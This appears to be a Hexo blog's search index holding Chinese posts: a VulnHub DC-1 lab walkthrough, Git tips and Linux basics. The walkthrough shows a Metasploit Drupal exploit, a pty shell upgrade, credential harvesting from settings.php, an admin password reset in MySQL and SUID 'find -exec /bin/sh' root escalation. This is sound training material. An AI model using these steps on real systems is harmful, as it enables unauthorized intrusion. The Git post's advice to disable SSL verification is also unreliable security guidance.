<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>DC_1靶机渗透测试</title>
      <link href="/2020/09/14/DC_1/"/>
      <url>/2020/09/14/DC_1/</url>
      
        <content type="html"><![CDATA[<h1 id="DC-1靶机渗透测试"><a href="#DC-1靶机渗透测试" class="headerlink" title="DC_1靶机渗透测试"></a>DC_1靶机渗透测试</h1><ul><li>[参考链接1](<a href="https://zhuanlan.zhihu.com/p/135342104">萌新教程丨VulnHubDC系列之DC1靶机渗透测试 - 知乎 (zhihu.com)</a>)</li><li>[参考链接2](<a href="https://www.jianshu.com/p/86b3c598a4c4">Vulnhub靶机渗透测试——DC-1 - 简书 (jianshu.com)</a>)</li><li><a href="%5B(4%E6%9D%A1%E6%B6%88%E6%81%AF">参考链接3</a> Vulnhub-DC1靶机渗透_adminuil的博客-CSDN博客](<a href="https://blog.csdn.net/adminuil/article/details/101269264">https://blog.csdn.net/adminuil/article/details/101269264</a>))</li><li>[参考链接4]([Linux suid 提权 - Junsec - 博客园 (cnblogs.com)](<a href="https://www.cnblogs.com/junsec/p/11652723.html#:~:text=Linux">https://www.cnblogs.com/junsec/p/11652723.html#:~:text=Linux</a> suid 提权. SUID ( S et owner,在 Linux%2FUnix中，当一个程序运行的时候， 程序将从登录用户处继承权限。. SUID被定义为给予一个用户临时的（程序%2F文件）所有者的权限来运行一个程序%2F文件 。. 用户在执行程序%2F文件%2F命令的时候，将获取文件所有者的权限以及所有者的UID和GID。. 查找suid文件. %3F))</li></ul><h2 id="一、DC-1的准备"><a href="#一、DC-1的准备" class="headerlink" title="一、DC_1的准备"></a>一、DC_1的准备</h2><ol><li> 在官网上下载DC_1镜像文件到电脑1上并且解压到虚拟机上，我使用的是VMware</li><li>将DC_1与攻击机器配置在同一网段上</li></ol><p><a href="https://imgtu.com/i/R9rCFS"><img "" class="lazyload placeholder" data-original="https://z3.ax1x.com/2021/06/18/R9rCFS.png" src="https://img10.360buyimg.com/ddimg/jfs/t1/157667/29/9156/134350/603c6445Ebbc9cabe/41219c5d36d45072.gif" alt="R9rCFS.png"></a></p><ul><li>以管理员权限<strong>更改设置</strong></li></ul><p><img "" class="lazyload placeholder" data-original="http://cdn.mxrblog.cn/DC_1_2.jpg" src="https://img10.360buyimg.com/ddimg/jfs/t1/157667/29/9156/134350/603c6445Ebbc9cabe/41219c5d36d45072.gif" alt="DC_1_2"></p><ul><li>查看物理电脑正在使用的网卡，将虚拟机网卡设置为一致</li></ul><p><img "" class="lazyload placeholder" data-original="http://cdn.mxrblog.cn/DC1_3.png" src="https://img10.360buyimg.com/ddimg/jfs/t1/157667/29/9156/134350/603c6445Ebbc9cabe/41219c5d36d45072.gif" alt="DC1_3"></p><h2 id="二、信息收集"><a href="#二、信息收集" class="headerlink" title="二、信息收集"></a>二、信息收集</h2><h3 id="1-nmap"><a href="#1-nmap" class="headerlink" title="1. nmap"></a>1. nmap</h3><ul><li>先使用nmap侦测DC1的IP地址</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sP 192.168.0.0/24       //查询这个网段里面的活的IP</span><br></pre></td></tr></table></figure><p><img "" class="lazyload placeholder" data-original="http://cdn.mxrblog.cn/image-20210619095954498.png" src="https://img10.360buyimg.com/ddimg/jfs/t1/157667/29/9156/134350/603c6445Ebbc9cabe/41219c5d36d45072.gif" alt="image-20210619095954498"></p><h3 id="2-arp-scan-l"><a href="#2-arp-scan-l" class="headerlink" title="2. arp-scan -l"></a>2. arp-scan -l</h3><ul><li>再使用sudo arp-scan -l 探测，可知DC_1的IP是192.168.0.155</li></ul><p><img "" class="lazyload placeholder" data-original="http://cdn.mxrblog.cn/image-20210619100321088.png" src="https://img10.360buyimg.com/ddimg/jfs/t1/157667/29/9156/134350/603c6445Ebbc9cabe/41219c5d36d45072.gif" alt="image-20210619100321088"></p><h3 id="3-查看DC-1的开放端口"><a href="#3-查看DC-1的开放端口" class="headerlink" title="3. 查看DC_1的开放端口"></a>3. 查看DC_1的开放端口</h3><ul><li>使用nmap -sV -A 192.168.0.155 可以发现DC_1开放了80端口</li></ul><p><img "" class="lazyload placeholder" data-original="http://cdn.mxrblog.cn/image-20210619100832836.png" src="https://img10.360buyimg.com/ddimg/jfs/t1/157667/29/9156/134350/603c6445Ebbc9cabe/41219c5d36d45072.gif" alt="image-20210619100832836"></p><h3 id="4-登陆192-168-0-155-80"><a href="#4-登陆192-168-0-155-80" class="headerlink" title="4. 登陆192.168.0.155:80"></a>4. 登陆192.168.0.155:80</h3><ul><li>发现网站下面有powered by Drupal，可以推断出网站的CMS是Drupal</li></ul><p><img "" class="lazyload placeholder" data-original="http://cdn.mxrblog.cn/image-20210619101204599.png" src="https://img10.360buyimg.com/ddimg/jfs/t1/157667/29/9156/134350/603c6445Ebbc9cabe/41219c5d36d45072.gif" alt="image-20210619101204599"></p><h2 id="二、寻找漏洞"><a href="#二、寻找漏洞" class="headerlink" title="二、寻找漏洞"></a>二、寻找漏洞</h2><ul><li>由于我们已经知晓网站的CMS是Drupal，于是我们可以使用msf探测Drupal的漏洞，并加以利用</li></ul><p><img "" class="lazyload placeholder" data-original="http://cdn.mxrblog.cn/image-20210619101755241.png" src="https://img10.360buyimg.com/ddimg/jfs/t1/157667/29/9156/134350/603c6445Ebbc9cabe/41219c5d36d45072.gif" alt="image-20210619101755241"></p><ul><li>使用漏洞4，并发现必须注明RHOSTS</li></ul><p><img "" class="lazyload placeholder" data-original="http://cdn.mxrblog.cn/image-20210619102053400.png" src="https://img10.360buyimg.com/ddimg/jfs/t1/157667/29/9156/134350/603c6445Ebbc9cabe/41219c5d36d45072.gif" alt="image-20210619102053400"></p><ul><li>注明Rhosts， 并且运行（exploit和run运行皆可）</li></ul><p><img "" class="lazyload placeholder" data-original="http://cdn.mxrblog.cn/image-20210619102607700.png" src="https://img10.360buyimg.com/ddimg/jfs/t1/157667/29/9156/134350/603c6445Ebbc9cabe/41219c5d36d45072.gif" alt="image-20210619102607700"></p><h2 id="三、寻找flag"><a href="#三、寻找flag" class="headerlink" title="三、寻找flag"></a>三、寻找flag</h2><ul><li>执行ls， 并且发现flag1</li></ul><p><img "" class="lazyload placeholder" data-original="http://cdn.mxrblog.cn/image-20210619102900990.png" src="https://img10.360buyimg.com/ddimg/jfs/t1/157667/29/9156/134350/603c6445Ebbc9cabe/41219c5d36d45072.gif" alt="image-20210619102900990"></p><ul><li>查看flag1的信息， 发现1在提示我们查看CMS的配置文件</li></ul><p><img "" class="lazyload placeholder" data-original="http://cdn.mxrblog.cn/image-20210619103026632.png" src="https://img10.360buyimg.com/ddimg/jfs/t1/157667/29/9156/134350/603c6445Ebbc9cabe/41219c5d36d45072.gif" alt="image-20210619103026632"></p><ul><li>通过网上搜素，发现Drupal的配置文件在 /var/www/sites/default 下，切换至该目录下，发现配置文件settings.php，查看内容发现flag2，并且提示不能使用字典暴力破解，通过观察配置文件，我们找到了MySQL的登录名以及密码</li></ul><p><img "" class="lazyload placeholder" data-original="http://cdn.mxrblog.cn/image-20210619103714950.png" src="https://img10.360buyimg.com/ddimg/jfs/t1/157667/29/9156/134350/603c6445Ebbc9cabe/41219c5d36d45072.gif" alt="image-20210619103714950"></p><ul><li>登录mysql，发现无法只用mysql命令</li></ul><p><img "" class="lazyload placeholder" data-original="http://cdn.mxrblog.cn/image-20210619104328728.png" src="https://img10.360buyimg.com/ddimg/jfs/t1/157667/29/9156/134350/603c6445Ebbc9cabe/41219c5d36d45072.gif" alt="image-20210619104328728"></p><ul><li>由于mfs终端下的局限性，可使用的命令较少，获取DC_1的shell并设置一个交互式shell用来回显MySQL指令</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">shell     //进入shell</span><br><span class="line">python -c &quot;import pty;pty.spawn(&#x27;/bin/bash&#x27;)&quot;   //设置交互式shell</span><br></pre></td></tr></table></figure><p><img "" class="lazyload placeholder" data-original="http://cdn.mxrblog.cn/image-20210619104807264.png" src="https://img10.360buyimg.com/ddimg/jfs/t1/157667/29/9156/134350/603c6445Ebbc9cabe/41219c5d36d45072.gif" alt="image-20210619104807264"></p><ul><li>再次登录MySQL</li></ul><p><img "" class="lazyload placeholder" data-original="http://cdn.mxrblog.cn/image-20210619105030783.png" src="https://img10.360buyimg.com/ddimg/jfs/t1/157667/29/9156/134350/603c6445Ebbc9cabe/41219c5d36d45072.gif" alt="image-20210619105030783"></p><ul><li>寻找储存有用信息的表</li></ul><p><img "" class="lazyload placeholder" data-original="http://cdn.mxrblog.cn/image-20210619105436601.png" src="https://img10.360buyimg.com/ddimg/jfs/t1/157667/29/9156/134350/603c6445Ebbc9cabe/41219c5d36d45072.gif" alt="image-20210619105436601"></p><ul><li>发现表users</li></ul><p><img "" class="lazyload placeholder" data-original="http://cdn.mxrblog.cn/image-20210619105516728.png" src="https://img10.360buyimg.com/ddimg/jfs/t1/157667/29/9156/134350/603c6445Ebbc9cabe/41219c5d36d45072.gif" alt="image-20210619105516728"></p><ul><li>查看表users的内容， 发现管理员以及经过加密后的密码，通过网上搜索，得知该CMS的加密方式文件在 /var/www/scripts/password-hash.sh</li></ul><p><img "" class="lazyload placeholder" data-original="http://cdn.mxrblog.cn/image-20210619105726822.png" src="https://img10.360buyimg.com/ddimg/jfs/t1/157667/29/9156/134350/603c6445Ebbc9cabe/41219c5d36d45072.gif" alt="image-20210619105726822"></p><ul><li>经过Google得知，使用  ./scripts/password-hash.sh   %^@#&amp;  可以加密，获取加密后的密码</li></ul><p><img "" class="lazyload placeholder" data-original="http://cdn.mxrblog.cn/image-20210619110656291.png" src="https://img10.360buyimg.com/ddimg/jfs/t1/157667/29/9156/134350/603c6445Ebbc9cabe/41219c5d36d45072.gif" alt="image-20210619110656291"></p><ul><li>再次进入数据库并且更改管理员的密码</li></ul><p><img "" class="lazyload placeholder" data-original="http://cdn.mxrblog.cn/image-20210619111111061.png" src="https://img10.360buyimg.com/ddimg/jfs/t1/157667/29/9156/134350/603c6445Ebbc9cabe/41219c5d36d45072.gif" alt="image-20210619111111061"></p><ul><li>利用更改后的账号密码登录网站，寻找后发现flag3，flag3的信息中提到了passwd和shadow,很明显就是<code>/etc/passwd和/etc/shadow</code>，还提到了<code>find、perms、-exec</code>，这几个是提权用的。</li></ul><p><img "" class="lazyload placeholder" data-original="http://cdn.mxrblog.cn/image-20210619111628491.png" src="https://img10.360buyimg.com/ddimg/jfs/t1/157667/29/9156/134350/603c6445Ebbc9cabe/41219c5d36d45072.gif" alt="image-20210619111628491"></p><ul><li>查看 /etc/passwd，可以找到flag4的位置</li></ul><p><img "" class="lazyload placeholder" data-original="http://cdn.mxrblog.cn/image-20210619113107387.png" src="https://img10.360buyimg.com/ddimg/jfs/t1/157667/29/9156/134350/603c6445Ebbc9cabe/41219c5d36d45072.gif" alt="image-20210619113107387"></p><ul><li>查看flag4的内容，发现在root下有flag，需要提权</li></ul><p><img "" class="lazyload placeholder" data-original="http://cdn.mxrblog.cn/image-20210619113333252.png" src="https://img10.360buyimg.com/ddimg/jfs/t1/157667/29/9156/134350/603c6445Ebbc9cabe/41219c5d36d45072.gif" alt="image-20210619113333252"></p><ul><li>通过find命令查看有哪些使用root权限执行的文件</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find / -perm -u=s -type f 2&gt;/dev/null</span><br></pre></td></tr></table></figure><p><img "" class="lazyload placeholder" data-original="http://cdn.mxrblog.cn/image-20210619114815699.png" src="https://img10.360buyimg.com/ddimg/jfs/t1/157667/29/9156/134350/603c6445Ebbc9cabe/41219c5d36d45072.gif" alt="image-20210619114815699"></p><ul><li>发现find可以利用，并且获取root权限</li></ul><p><img "" class="lazyload placeholder" data-original="http://cdn.mxrblog.cn/image-20210619115449178.png" src="https://img10.360buyimg.com/ddimg/jfs/t1/157667/29/9156/134350/603c6445Ebbc9cabe/41219c5d36d45072.gif" alt="image-20210619115449178"></p><ul><li>进入root目录，发现并打开最后一个flag</li></ul><p><img "" class="lazyload placeholder" data-original="http://cdn.mxrblog.cn/image-20210619115723615.png" src="https://img10.360buyimg.com/ddimg/jfs/t1/157667/29/9156/134350/603c6445Ebbc9cabe/41219c5d36d45072.gif" alt="image-20210619115723615"></p><ul><li><strong>另外还可以使用find + netcat的方式获取root权限</strong></li></ul><ul><li><em>对于靶机shell，发送自己的shell</em></li></ul><p><img "" class="lazyload placeholder" data-original="http://cdn.mxrblog.cn/image-20210619120620378.png" src="https://img10.360buyimg.com/ddimg/jfs/t1/157667/29/9156/134350/603c6445Ebbc9cabe/41219c5d36d45072.gif" alt="image-20210619120620378"></p><ul><li><em>对于攻击机器，监听靶机上建立特意开放的端口号</em></li></ul><p><img "" class="lazyload placeholder" data-original="http://cdn.mxrblog.cn/image-20210619120759548.png" src="https://img10.360buyimg.com/ddimg/jfs/t1/157667/29/9156/134350/603c6445Ebbc9cabe/41219c5d36d45072.gif" alt="image-20210619120759548"></p><h2 id="知识点"><a href="#知识点" class="headerlink" title="知识点"></a>知识点</h2><h3 id="Linux-suid-提权-Linux-suid-提权-Junsec-博客园-cnblogs-com-https-www-cnblogs-com-junsec-p-11652723-html-text-Linux-suid-提权-SUID-S-et-owner-在-Linux-2FUnix中，当一个程序运行的时候，-程序将从登录用户处继承权限。-SUID被定义为给予一个用户临时的（程序-2F文件）所有者的权限来运行一个程序-2F文件-。-用户在执行程序-2F文件-2F命令的时候，将获取文件所有者的权限以及所有者的UID和GID。-查找suid文件-3F"><a href="#Linux-suid-提权-Linux-suid-提权-Junsec-博客园-cnblogs-com-https-www-cnblogs-com-junsec-p-11652723-html-text-Linux-suid-提权-SUID-S-et-owner-在-Linux-2FUnix中，当一个程序运行的时候，-程序将从登录用户处继承权限。-SUID被定义为给予一个用户临时的（程序-2F文件）所有者的权限来运行一个程序-2F文件-。-用户在执行程序-2F文件-2F命令的时候，将获取文件所有者的权限以及所有者的UID和GID。-查找suid文件-3F" class="headerlink" title="[Linux suid 提权]([Linux suid 提权 - Junsec - 博客园 (cnblogs.com)](https://www.cnblogs.com/junsec/p/11652723.html#:~:text=Linux suid 提权. SUID ( S et owner,在 Linux%2FUnix中，当一个程序运行的时候， 程序将从登录用户处继承权限。. SUID被定义为给予一个用户临时的（程序%2F文件）所有者的权限来运行一个程序%2F文件 。. 用户在执行程序%2F文件%2F命令的时候，将获取文件所有者的权限以及所有者的UID和GID。. 查找suid文件. %3F))"></a>[Linux suid 提权]([Linux suid 提权 - Junsec - 博客园 (cnblogs.com)](<a href="https://www.cnblogs.com/junsec/p/11652723.html#:~:text=Linux">https://www.cnblogs.com/junsec/p/11652723.html#:~:text=Linux</a> suid 提权. SUID ( S et owner,在 Linux%2FUnix中，当一个程序运行的时候， 程序将从登录用户处继承权限。. SUID被定义为给予一个用户临时的（程序%2F文件）所有者的权限来运行一个程序%2F文件 。. 用户在执行程序%2F文件%2F命令的时候，将获取文件所有者的权限以及所有者的UID和GID。. 查找suid文件. %3F))</h3><p>　<strong>SUID</strong> (<strong>S</strong>et owner <strong>U</strong>ser <strong>ID</strong> up on execution) 是给予文件的一个特殊类型的文件权限。在 Linux/Unix中，当一个程序运行的时候， 程序将从登录用户处继承权限。SUID被定义为给予一个用户临时的（程序/文件）所有者的权限来运行一个程序/文件<strong>。用户在执行程序/文件/命令的时候，将获取文件所有者的权限以及所有者的UID和GID。</strong></p><ul><li>查找suid文件</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">find / -perm -u=s -type f 2&gt; /dev/null</span><br><span class="line">/表示从文件系统的顶部（根）开始并找到每个目录</span><br><span class="line">-perm 表示搜索随后的权限``-u = s表示查找root用户拥有的文件</span><br><span class="line">type表示我们正在寻找的文件类型</span><br><span class="line">f 表示常规文件，而不是目录或特殊文件</span><br><span class="line">2表示该进程的第二个文件描述符，即stderr（标准错误）</span><br><span class="line">&gt;表示重定向</span><br><span class="line">/ dev / null是一个特殊的文件系统对象，它将丢弃写入其中的所有内容。</span><br></pre></td></tr></table></figure><ul><li>find提权</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find -exec /bin/sh \;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 渗透测试 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 渗透测试 </tag>
            
            <tag> DC </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Git&amp;Github</title>
      <link href="/2020/09/14/Git/"/>
      <url>/2020/09/14/Git/</url>
      
        <content type="html"><![CDATA[<ul><li><p>Git 初始化</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"># 设置github昵称</span><br><span class="line">git config --global user.name &#x27;mxrmiss&#x27;</span><br><span class="line"># 设置github邮箱</span><br><span class="line">git config --global user.email &#x27;heroli520@outlook.com&#x27;</span><br></pre></td></tr></table></figure></li><li><p>git status 无法显示中文</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git config --global core.quotepath false</span><br></pre></td></tr></table></figure><span id="more"></span></li><li><p>git 无法推送新文件到github仓库原因</p><ol><li>可能仓库内已经有东西了，而且使用的推送命令不对</li><li>或是原来的仓库内的东西是通过网页进行上传的， 而不还是通过命令行进行上传的</li><li>强制使用命令  “git commit 文件 +mster” 可能会使原仓库内的东西丢失</li></ol></li><li><p>查看git简单配置</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git config --list</span><br></pre></td></tr></table></figure></li><li><p>是git无密向github传输文件</p><ol><li>终端输入ssh-keygen, 之后不断按回车</li><li>会产生一对公密和私密，存储在家目录下的 .ssh 目录中</li><li>cat ～/.ssh/id_rsa.pub ，复制输出的公密内容至 github个人主页setting中的ssh中，并保存</li><li>ssh -T <a href="mailto:&#x67;&#105;&#116;&#x40;&#x67;&#x69;&#x74;&#x68;&#x75;&#98;&#x2e;&#x63;&#111;&#x6d;">&#x67;&#105;&#116;&#x40;&#x67;&#x69;&#x74;&#x68;&#x75;&#98;&#x2e;&#x63;&#111;&#x6d;</a> #打开git bash输入此命令，显示successful表示成功</li><li>以后clone仓库地址时就可以直接使用</li></ol></li><li><p>向仓库更新文件基本命令</p></li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">git status</span><br><span class="line">git add *</span><br><span class="line">git commit -m &quot;内容描述&quot;</span><br><span class="line">git push</span><br></pre></td></tr></table></figure><ul><li><p>无法读取远程仓库</p><p>删除blog文件夹下的隐藏文件 .deploy_git</p></li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">fatal: 无法读取远程仓库。</span><br><span class="line"></span><br><span class="line">请确认您有正确的访问权限并且仓库存在。</span><br></pre></td></tr></table></figure><h3 id="git-clonne"><a href="#git-clonne" class="headerlink" title="git clonne"></a>git clonne</h3><ol><li>fatal: unable to access ‘<a href="https://xxx/">https://XXX</a>: Failed onnect to github. com port 443: Timed out</li></ol><ul><li>解决方法</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git config --global --unset http.proxy</span><br></pre></td></tr></table></figure><ol start="2"><li>failed to receive handshake, SSL/TLS connection failed</li></ol><ul><li>解决方法</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git config --global http.sslBackend &quot;openssl&quot;</span><br></pre></td></tr></table></figure><ol start="3"><li><a href="https://www.cnblogs.com/jfen625/p/12995408.html">OpenSSL SSL_read: Connection was reset, errno 10054</a></li></ol><ul><li>解决方法</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git config --global http.sslVerify &quot;false&quot;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> git </category>
          
      </categories>
      
      
        <tags>
            
            <tag> git </tag>
            
            <tag> github </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Linux基础操作</title>
      <link href="/2020/09/14/Linux%E5%9F%BA%E7%A1%80/"/>
      <url>/2020/09/14/Linux%E5%9F%BA%E7%A1%80/</url>
      
        <content type="html"><![CDATA[<p><a href="https://book.apeland.cn/details/189/">本笔记的友情链接</a></p><h2 id="常用目录介绍"><a href="#常用目录介绍" class="headerlink" title="常用目录介绍"></a>常用目录介绍</h2><ol><li>boot    存放启动文件</li><li>dev     存放设备文件</li><li>etc     存放配置文件</li><li>home    普通用户家目录，以/home/$username的方式存放</li><li>media   移动存储自动挂载目录,以 /media/$device_name的方式来存放</li><li>mnt     手动挂载目录</li><li>opt     三方软件安装目录</li><li>proc    内存系统文件</li><li>root    管理员家目录</li><li>run     里面的东西是系统运行时需要的, 不能随便删除. 但是重启的时候应该抛弃. 下次系统运行时重新生成</li><li>srv     服务相关数据</li><li>sys     系统文件</li><li>tmp     临时文件夹</li><li>usr     存放库文件、文档、命令、用户数据等</li><li>var     日志存放lib     库文件<span id="more"></span></li></ol><ul><li>-echo相当于python中的print，即输出、打印的意思</li></ul><h2 id="linux基本命令"><a href="#linux基本命令" class="headerlink" title="linux基本命令"></a>linux基本命令</h2><h3 id="命令-命令选项-参数"><a href="#命令-命令选项-参数" class="headerlink" title="命令[命令选项][参数]"></a>命令[命令选项][参数]</h3><p>​    {必选项}， [可选项]</p><p>1）清屏命令：clear      快捷键  ctrl+l<br>2）帮助命令：man<br>3）进入文件夹命令: cd  【change dir，cd理解为改变目录的意思】<br>4）列出当前目录内容命令：ls   [-a -l -d ] 【list】<br>5）显示主机名：hostname<br>6）显示日期时间：date [-s %F]<br>7）显示日历：cal<br>8）计算器：bc<br>9）重启命令：reboot     shutdown -r      init 6<br>10）注销命令：logout<br>11）关机命令：halt      shutdown -h         init 0<br>12) 显示当前操作系统和机器的信息: uname<br>13) 显示当前路径: pwd 【定位自己的位置】</p><p>-多个命令选项可以用一个 — 拼凑在一起，若命令产生了冲突，则以排最后的为主<br>-命令选项写全称时，前面加 — —</p><ul><li><p>从命令行启动图形界面的默认图片查看器</p><p>​    运行命令：xdg-open filename.png</p></li><li><p>在命令行打开一个图片:</p><ol><li><p>apt install fim</p></li><li><p>fim filename.png</p><ul><li><p>fim是fbi的升级版</p><p><a href="http://www.itpro.net.cn/2019/12/linux">有关于fim的操作链接</a></p></li></ul></li></ol></li><li><p>apt 与apt-get 的区别：apt-get 是 apt 的子集</p></li><li><p>更新安装包：apt upgrade</p></li></ul><h3 id="安装内核头文件"><a href="#安装内核头文件" class="headerlink" title="安装内核头文件"></a>安装内核头文件</h3><ul><li>输入命令：apt-get install linux-headers-$(uname -r)或者直接敲apt-get install linux-headers-在这时候你按键盘上的tab键，找你本系统的头文件安装即可</li></ul><h3 id="安装照相机"><a href="#安装照相机" class="headerlink" title="安装照相机"></a>安装照相机</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt install cheese</span><br></pre></td></tr></table></figure><h3 id="u盘修改只读模式"><a href="#u盘修改只读模式" class="headerlink" title="u盘修改只读模式"></a>u盘修改只读模式</h3><ol><li>查看U盘分区</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo fdisk -l</span><br></pre></td></tr></table></figure><ol start="2"><li>查看U盘的挂载点</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">df U盘分区</span><br></pre></td></tr></table></figure><ol start="3"><li>卸载原挂载的U盘</li><li>修复U盘的文件管理系统</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo dosfsck -v -a [U盘分区]</span><br></pre></td></tr></table></figure><ol start="5"><li>重新挂载</li></ol><h3 id="蓝牙"><a href="#蓝牙" class="headerlink" title="蓝牙"></a>蓝牙</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo service bluetooth start  //打开蓝牙配适器</span><br><span class="line">sudo service bluetooth stop   //关闭蓝牙配适器</span><br></pre></td></tr></table></figure><h3 id="关闭进程"><a href="#关闭进程" class="headerlink" title="关闭进程"></a>关闭进程</h3><ul><li>有时候应用被我们1关闭了，可它还在后台运行，这就要求我们手动关闭进程</li><li>kill -9 进程IP    //可利用htop命令查看进程IP</li><li>若没有htop，可下载</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt install htop</span><br></pre></td></tr></table></figure><h3 id="卸载-IntelliJ-IDEA-类似卸载可参考"><a href="#卸载-IntelliJ-IDEA-类似卸载可参考" class="headerlink" title="卸载 IntelliJ IDEA(类似卸载可参考)"></a>卸载 IntelliJ IDEA(类似卸载可参考)</h3><ol><li>寻找Intellij IDEA 里面是否有uninstall.sh文件，有就能直接卸载</li><li>若没有，则在里面找说明文档，找到相关配置文件所在的目录，将IntelliJ IDEA 文件夹及其相关配置文件一起删除</li><li>可能会存在开始菜单栏里依然有图标显示的问题，</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cd ~/.local/share/applications</span><br></pre></td></tr></table></figure><ol start="4"><li>之后在applications文件夹里找到相对应的配置文件删除即可</li></ol><h3 id="linux换源"><a href="#linux换源" class="headerlink" title="linux换源"></a>linux换源</h3><ul><li>进入目录  /etc/apt/</li><li>sudo vim source.list</li><li>上网寻找适合自己的源</li></ul><h3 id="关于Anaconda的安装"><a href="#关于Anaconda的安装" class="headerlink" title="关于Anaconda的安装"></a>关于Anaconda的安装</h3><ul><li><p>在清华镜像站下载Anaconda</p></li><li><p>安装后修改环境变量</p><ul><li><p>sudo vim /etc/profile</p></li><li><p>向里面写入  export PATH=$PATH:/home/balacksheep/anaconda3/bin:$PATH</p><pre><code>                       %%blacksheep为用户名，应选择自己的路                            径配置环境变量</code></pre></li></ul></li><li><p>安装后命令行使用时前面有base，代表安装成功，不需要去掉base，对使用无影响</p></li><li><p>更换anaconda的源，以清华源举例：</p><ul><li><p>sudo vim ~/.condarc</p></li><li><p>向里面写入：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">channels:</span><br><span class="line">https://mirrors.ustc.edu.cn/anaconda/pkgs/main/</span><br><span class="line">https://mirrors.ustc.edu.cn/anaconda/cloud/conda-forge/</span><br><span class="line">https://mirrors.tuna.tsinghua.edu.cn/anaconda/pkgs/free/</span><br><span class="line">defaults</span><br><span class="line">show_channel_urls: true</span><br></pre></td></tr></table></figure></li></ul></li></ul><h3 id="关于qq的安装问题"><a href="#关于qq的安装问题" class="headerlink" title="关于qq的安装问题"></a>关于qq的安装问题</h3><ul><li>在kali系统中，输入wine，系统会自动提示你wine未安装，此时按照提示给的步骤来就行了</li><li>关于字体问题：qq安装好了后会发现有些字体变成了乱码，此时可以安装一些字体来解决</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">apt-get install xfonts-intl-chinese</span><br><span class="line">apt-get install ttf-wqy-microhei</span><br></pre></td></tr></table></figure><ul><li>关于QQ用wine装好后找不到的问题<ul><li>wine 默认被配置成home文件下的隐藏文件，cd .wine即可调出</li><li>输入~/.wine/drive_c/Program Files (x86)/Tencent/QQ/Bin</li><li>你会发现里面优QQ.exe文件，输入wine QQ 或wine QQ.exe即可调出QQ程序</li><li>为了方便，可以把QQ/Bin 放到home文件下</li></ul></li></ul><h3 id="关于输入法的问题"><a href="#关于输入法的问题" class="headerlink" title="关于输入法的问题"></a>关于输入法的问题</h3><ul><li>搜狗输入法兼容性不咋地，反正安装了很多遍都不行</li><li>谷歌输入法可以用，基于小企鹅输入法使用，但是也不咋地，毕竟是外国人做的中国输入法，不怎么走心</li><li>推荐使用百度输入法，基于小企鹅输入法，首先上官网搜索压缩包，解压后找到安装包文件进行安装，最重要一点是安装后关机重启，重启后系统会自动帮助你进行百度输入法的一些个性化的设置，接着到输入法设置中应用百度输入法就OK了</li></ul><h3 id="wps字体问题"><a href="#wps字体问题" class="headerlink" title="wps字体问题"></a>wps字体问题</h3><ul><li>使用wps for linux2019 时可能有些中文字体会出现乱码，原因是系统缺失相应的字体</li><li>将Windows系统下的Windows目录中的Fonts文件夹复制到Linux系统中的/usr/share/fonts/目录下，再执行以下命令</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sudo fc-cache 